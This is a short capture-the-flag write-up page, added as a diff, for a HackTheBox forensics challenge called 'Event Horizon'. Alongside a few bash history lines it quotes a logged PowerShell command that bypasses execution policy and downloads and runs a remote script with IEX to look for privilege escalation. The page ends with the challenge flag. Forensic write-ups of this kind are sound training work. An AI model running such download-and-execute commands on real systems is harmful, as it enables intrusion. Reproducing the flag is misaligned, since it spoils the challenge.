@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Event Horizon (Forensics Challenge) · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/challenges/event-horizon.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/challenges/index.html">Completed Challenges</a></div>
+  <h1 id="event-horizon-forensics-challenge">Event Horizon (Forensics Challenge)</h1>
+<pre><code class="language-bash">522  export PATH=$PATH:/usr/local/go/bin
+525  tar -C /usr/local -xzf go1.19.linux-amd64.tar.gz
+526  sudo tar -C /usr/local -xzf go1.19.linux-amd64.tar.gz
+527  export PATH=$PATH:/usr/local/go/bin
+751  history | grep local
+</code></pre>
+<p><span class="img-missing">image unavailable</span><br />
+<span class="img-missing">image unavailable</span></p>
+<pre><code class="language-bash">Host Application = powershell -ep bypass -c IEX (New-Object Net.WeBcLIENT).Downloadstring('https://gist.githubusercontent.com/blueteampathway/c5735d8a38a02e1cb903a53c6ba860e7/raw/e5caae5b0e2537a5891d71d127866733a367add4/gistfile1.txt');Invoke-AllChecks
+
+</code></pre>
+<p><span class="img-missing">image unavailable</span></p>
+<pre><code class="language-bash">HTB{8Lu3_734m_F0r3v3R}
+</code></pre>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
